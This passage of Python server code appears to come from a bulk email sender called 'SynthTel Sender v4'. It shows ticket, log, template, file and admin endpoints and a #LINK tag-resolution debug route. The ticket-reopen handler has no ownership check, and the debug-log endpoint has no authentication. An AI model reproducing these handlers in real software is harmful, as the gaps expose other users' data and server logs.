                    conn.close(); self._json(403, {"error": "Access denied"}); return
                conn.execute(
                    "UPDATE support_tickets SET status='closed', updated_at=? WHERE id=?",
                    (datetime.now().isoformat(), tid)
                )
                owner_id = ticket[0]
                conn.commit(); conn.close()
            if TG_AVAILABLE:
                try:
                    tg.notify_ticket_closed(tid, owner_id, sess["username"])
                except Exception:
                    pass
            self._json(200, {"status": "closed"})

        # ── Support: reopen ticket ────────────────────────────────────────
        elif p.startswith("/api/ticket/") and p.endswith("/reopen"):
            if not (sess := self._auth()): return
            try:
                tid = int(p.split("/")[3])
            except Exception:
                self._json(400, {"error": "Invalid ticket ID"}); return
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                conn.execute(
                    "UPDATE support_tickets SET status='open', updated_at=? WHERE id=?",
                    (datetime.now().isoformat(), tid)
                )
                conn.commit(); conn.close()
            self._json(200, {"status": "open"})

        # ── Admin: send Telegram message to user ─────────────────────────
        elif p == "/api/admin/tg-notify":
            if not (sess := self._admin()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            if not TG_AVAILABLE:
                self._json(503, {"error": "Telegram not configured"}); return
            uid = data.get("user_id")
            msg = (data.get("message", "") or "").strip()[:2000]
            if not uid or not msg:
                self._json(400, {"error": "user_id and message required"}); return
            tg.notify_user(int(uid),
                "📢 <b>Message from Admin</b>\n\n" + msg)
            self._json(200, {"status": "ok"})

        elif p == "/api/logs":
            if not (sess := self._auth()): return
            try:
                lines = int(self.params.get("lines", [100])[0])
                lines = min(lines, 500)
            except Exception:
                lines = 100
            try:
                with open(LOG_PATH, "r", errors="replace") as f:
                    all_lines = f.readlines()
                tail = "".join(all_lines[-lines:])
            except Exception as e:
                tail = f"[Log file not found or unreadable: {e}]"
            self._json(200, {"log": tail, "path": LOG_PATH})

        elif p == "/api/debug-log":
            clear = self.params.get("clear", ["0"])[0] == "1"
            with _dbg_lock:
                entries = list(_DEBUG_BUF)
                if clear: _DEBUG_BUF.clear()
            self._json(200, {"entries": entries, "count": len(entries)})

        elif p == "/api/debug-tags":
            if not (sess := self._auth()): return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            from core.tags import build_context, resolve_tags
            template  = data.get("template", "Hi, #LINK check this out.")
            links_raw = data.get("links", [])
            mode      = data.get("mode", "sequential")
            links_cfg = {"links": [{"url": u} for u in links_raw if u], "mode": mode} if links_raw else {}
            ctx = build_context(
                lead   = {"email": "test@example.com", "name": "Test"},
                sender = {"fromEmail": "from@example.com", "fromName": "Sender"},
                subject="Test", counter=1, links_cfg=links_cfg,
            )
            resolved = resolve_tags(template, ctx)
            self._json(200, {
                "template":  template,
                "resolved":  resolved,
                "links_cfg": links_cfg,
                "link_replaced": "#LINK" not in resolved,
                "note": "If link_replaced is false, links_cfg was empty — check you clicked Apply in the UI"
            })

        else:
            self._json(404, {"error": "Not found"})

    # ── PATCH ────────────────────────────────────────────────

    def do_PATCH(self):
        p = self.path
        # Rename / update file metadata
        if p.startswith("/api/files/"):
            if not (sess := self._auth()): return
            try:
                fid = int(p.split("/")[3])
            except Exception:
                self._json(400, {"error": "Invalid file ID"}); return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            uid = sess["user_id"]
            new_name = data.get("display_name", data.get("name", ""))[:255]
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                row = conn.execute(
                    "SELECT id FROM user_files WHERE id=? AND user_id=?", (fid, uid)
                ).fetchone()
                if row:
                    conn.execute(
                        "UPDATE user_files SET display_name=? WHERE id=?",
                        (new_name, fid)
                    )
                    conn.commit()
                conn.close()
            if row:
                self._json(200, {"status": "ok", "display_name": new_name})
            else:
                self._json(404, {"error": "File not found"})
        elif p.startswith("/api/templates/"):
            if not (sess := self._auth()): return
            try:
                tid = int(p.split("/")[3])
            except Exception:
                self._json(400, {"error": "Invalid template ID"}); return
            try:
                data = self._read_body()
            except Exception:
                self._json(400, {"error": "Invalid JSON"}); return
            uid = sess["user_id"]
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                row = conn.execute(
                    "SELECT id FROM user_templates WHERE id=? AND user_id=?", (tid, uid)
                ).fetchone()
                if row:
                    fields = []
                    vals   = []
                    for k in ("name","subject","html","plain"):
                        if k in data:
                            fields.append(f"{k}=?")
                            vals.append(data[k][:50000] if k in ("html","plain") else data[k][:500])
                    if fields:
                        fields.append("updated_at=?")
                        vals.append(datetime.now().isoformat())
                        vals.append(tid)
                        conn.execute(f"UPDATE user_templates SET {','.join(fields)} WHERE id=?", vals)
                        conn.commit()
                conn.close()
            if row:
                self._json(200, {"status": "ok"})
            else:
                self._json(404, {"error": "Template not found"})
        else:
            self._json(404, {"error": "Not found"})

    # ── DELETE ───────────────────────────────────────────────

    def do_DELETE(self):
        p = self.path
        if p.startswith("/api/files/"):
            if not (sess := self._auth()): return
            try:
                fid = int(p.split("/")[3])
            except Exception:
                self._json(400, {"error": "Invalid file ID"}); return
            uid = sess["user_id"]
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                row = conn.execute(
                    "SELECT filename,category FROM user_files WHERE id=? AND user_id=?",
                    (fid, uid)
                ).fetchone()
                if row:
                    conn.execute("DELETE FROM user_files WHERE id=?", (fid,))
                    conn.commit()
                conn.close()
            if row:
                fpath = os.path.join(FILES_DIR, str(uid), row[1], row[0])
                try:
                    os.remove(fpath)
                except Exception:
                    pass
                self._json(200, {"status": "ok"})
            else:
                self._json(404, {"error": "File not found"})

        elif p.startswith("/api/templates/"):
            if not (sess := self._auth()): return
            try:
                tid = int(p.split("/")[3])
            except Exception:
                self._json(400, {"error": "Invalid template ID"}); return
            uid = sess["user_id"]
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                row = conn.execute(
                    "SELECT id FROM user_templates WHERE id=? AND user_id=?", (tid, uid)
                ).fetchone()
                if row:
                    conn.execute("DELETE FROM user_templates WHERE id=?", (tid,))
                    conn.commit()
                conn.close()
            if row:
                self._json(200, {"status": "ok"})
            else:
                self._json(404, {"error": "Template not found"})

        elif p.startswith("/api/configs/"):
            if not (sess := self._auth()): return
            try:
                cid = int(p.split("/")[3])
            except Exception:
                self._json(400, {"error": "Invalid config ID"}); return
            uid = sess["user_id"]
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                row = conn.execute(
                    "SELECT id FROM user_configs WHERE id=? AND user_id=?", (cid, uid)
                ).fetchone()
                if row:
                    conn.execute("DELETE FROM user_configs WHERE id=?", (cid,))
                    conn.commit()
                conn.close()
            if row:
                self._json(200, {"status": "ok"})
            else:
                self._json(404, {"error": "Config not found"})

        elif p.startswith("/api/admin/users/"):
            if not (sess := self._admin()): return
            try:
                uid = int(p.split("/")[4])
            except Exception:
                self._json(400, {"error": "Invalid user ID"}); return
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                user = conn.execute("SELECT username FROM users WHERE id=?", (uid,)).fetchone()
                if not user:
                    conn.close(); self._json(404, {"error": "User not found"}); return
                if user[0] == sess["username"]:
                    conn.close(); self._json(400, {"error": "Cannot delete own account"}); return
                conn.execute("DELETE FROM users WHERE id=?", (uid,))
                conn.commit(); conn.close()
            with sessions_lock:
                to_kill = [t for t, s in SESSIONS.items() if s["user_id"] == uid]
                for t in to_kill: del SESSIONS[t]
            with db_lock:
                conn = sqlite3.connect(DB_PATH)
                conn.execute("DELETE FROM sessions WHERE user_id=?", (uid,))
                conn.commit(); conn.close()
            self._json(200, {"status": "ok"})
        else:
            self._json(404, {"error": "Not found"})

    # ── Logging ───────────────────────────────────────────────

    def log_message(self, fmt, *args):
        status  = args[1] if len(args) > 1 else "-"
        request = args[0] if args else "-"
        log.info("%s %s %s", self._ip(), status, request)


# ═══════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════

def main():
    init_db()
    os.makedirs(FILES_DIR, exist_ok=True)
    # Start Telegram bot polling if configured
    if TG_AVAILABLE:
        try:
            tg.start_polling()
            print("✦ Telegram bot polling started")
        except Exception as e:
            print(f"✦ Telegram polling skipped: {e}")
    port   = int(sys.argv[1]) if len(sys.argv) > 1 else 5001
    server = ThreadedHTTPServer(("127.0.0.1", port), SynthTelHandler)
    print(f"""
╔═══════════════════════════════════════════════╗
║   SynthTel Sender v4 — Modular Backend        ║
║   Listening on 127.0.0.1:{port:<18}║
║   Auth:  SQLite + bcrypt + session tokens     ║
║   Cores: 10/10 modules loaded                 ║
╚═══════════════════════════════════════════════╝
""")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped.")
        server.server_close()


if __name__ == "__main__":
    main()
